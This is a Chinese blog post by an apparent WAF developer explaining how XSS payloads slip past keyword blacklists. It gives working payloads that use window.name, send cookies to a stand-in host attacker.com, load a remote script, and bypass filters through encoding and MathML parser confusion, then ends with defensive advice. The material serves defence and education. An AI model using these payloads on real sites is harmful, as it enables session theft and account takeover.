# 我做了三年 WAF，直到看见这行代码，才知道自己一直在守一扇假门

我做 WAF（Web 应用防火墙）开发三年了。

这三年里，我见过各种奇形怪状的攻击 payload，也亲手写过几百条拦截规则。每次上线新规则，我都有一种说不清道不明的安全感——就像给门装了新锁，拍拍手，安心走人。

直到有一天，我看见了这行代码：

```
<input onfocus=location=name autofocus>
```

就这？区区 28 个字符？

我盯着它看了三秒，打开规则库搜了一遍。没有命中。 我又搜了一遍。还是没有。

那一刻，我突然意识到：我守了三年的门，可能从一开始就是假的。

***

### 门卫的错觉：WAF 到底在拦什么？

大多数人对 WAF 的印象是：有人发了坏东西，WAF 把它拦下来。但“坏东西”究竟该怎么定义？

现实中，大多数 WAF 的 XSS 规则本质上就是一张巨大的“词表”：

* `alert(`
* `prompt(`
* `confirm(`
* `<script>`
* `javascript:`

逻辑简单粗暴：黑名单里的词出现了就拦，没出现就放行。 这像极了学校门口的保安——只认校服，不认人。问题是，攻击者早就换上便衣了。

***

### window.name：一个被忽视十年的天然后门

让我们回到开头那行代码：

```
<input onfocus=location=name autofocus>
```

这里没有 `alert`，没有 `script`，没有任何常见的“危险词”。它只做了一件事：把 `window.name` 的值赋给 `location`（当前页面的地址）。在浏览器的全局作用域里，裸写 `name` 等同于 `window.name`。

大多数人只知道它是浏览器窗口的名字属性，却忽略了它一个诡异的特性：跨页面持久化。

如果你在 A 页面设置了 `window.name = "javascript:alert(1)"`，然后跳转到 B 页面——这个 `window.name` 的值依然存在。

这是 `window.name` 污染链和其他绕过手法最大的不同：它不需要在目标页面注入任何具体恶意代码，payload 早在跳转之前就已经就位了。 它是一个天然的隐形数据通道，跨域、持久、无声无息。

攻击链异常简洁：

1. 攻击者控制一个恶意页面，把真实 payload 写进 `window.name`。
2. 诱导用户点击链接，跳转到目标网站。
3. 目标网站触发那行看起来人畜无害的代码：`location=name`。
4. 攻击完成。

整个过程中，目标页面的源码里没有任何“危险词”。WAF 扫了一遍，一脸懵，直接放行。

***

### 弹窗只是表演，数据才是目的

很多人学 XSS，第一个学的都是弹窗。`alert(1)` 弹出来，截个图，心想：我懂 XSS 了。我当年也是如此。

但残酷的事实是：现代 XSS 攻击的目标，从来不是让你看见一个弹窗。

弹窗是上个时代的产物，是安全研究员用来“证明漏洞存在”的表演道具。真正的攻击者不需要表演，他们要的是你的数据。看看下面这些让人背脊发凉的 Payload：

```
<!-- fetch API 静默数据泄露 -->
<svg onload=fetch('//attacker.com/'+document.cookie)>
​
<!-- Beacon API 静默发送 -->
<img src=x onerror=navigator.sendBeacon('//attacker.com',document.cookie)>
​
<!-- 重定向窃取，无敏感函数调用 -->
<img src=x onerror=window.location='//attacker.com/'+document.cookie>
```

没有弹窗，没有报错，没有任何异常提示。你的 Cookie、Session Token 以及你登录态的一切，已经在你毫无察觉的情况下飞到了攻击者的服务器上。你还在等弹窗出现，人家早就拿到钥匙走了。

***

### 规则的边界，就是攻击者的入口

做安全这几年，我越来越确信一件事：规则永远滞后于攻击。 规则描述的是过去，而攻击者活在当下，甚至未来。

为了绕过那些死板的关键词拦截，红队和攻击者们演化出了极其复杂的绕过矩阵：

1.  DOM 属性篡改与逗号运算符链：

    ```
    <form><input onclick="formAction=top.name,type='submit',new submit">
    ```
2.  通过对象键名动态解析函数（间接调用）：

    ```
    <img src=x onerror=top[Object.keys(top)[5]](1)>
    ```
3.  CSS 动画触发 JS 执行（避开常规事件）：

    ```
    <style>@keyframes x{from{left:0}to{left:1px}}</style><div style="animation-name:x;position:relative" onanimationend=with(document)body.appendChild(createElement('script')).src='//attacker.com/x.js'>
    ```
4.  解析器混淆与命名空间切换（MathML → HTML）：

    ```
    <math><mi><annotation-xml encoding="text/html"><svg onload=location=String.fromCharCode(47,47,97,116,116,97,99,107,101,114)></annotation-xml></mi></math>
    ```

你刚封了 `javascript:` 协议，人家就开始用 Base64 叠加 DOM Clobbering；你刚把 `<script>` 加入黑名单，人家已经用动态 `import()` 加载远程模块了。

***

### 醒悟：我们真正应该防御什么？

单纯依靠关键词黑名单的 WAF 防御，就像是西西弗斯推石头。接受“规则永远不够用”这个现实，才是真正做好安全的开始。

踩了无数坑后，我总结了几个在防御端真正有用的思路：

1. 别只盯着关键词，要盯住行为 `location=`、`formAction=`、`.src=` 这类赋值操作，比单纯出现一个 `alert` 危险得多。关注属性被篡改的行为特征，而非特定字符串。
2. 将 window.name 视作高危通道 它是一个极其强大的跨域数据载体。任何引用 `name` 变量并赋值给敏感 DOM 属性的代码，都必须经过严格的安全审查。
3. 警惕多重编码与解析器嵌套 `atob()`、`String.fromCharCode()` 或是 `<math>` 标签嵌套——这都是在告诉你：有人在刻意隐藏意图。WAF 需要具备在多重解析上下文中还原真身的能力。
4. 构建纵深防御体系 WAF 只是第一道门，绝不是最后一道墙。严格的 CSP（内容安全策略）和 HttpOnly Cookie，才是真正让攻击者就算绕过 WAF 拿到 Payload 执行权限，也无计可施的终极防线。

我现在每次上线新规则，那种“装了新锁”的安全感已经消失了。取而代之的是一种清醒的不安：我知道这条规则能拦什么，更清楚它拦不住什么。

但正是这种不安，让我觉得自己终于开始真正懂安全了。
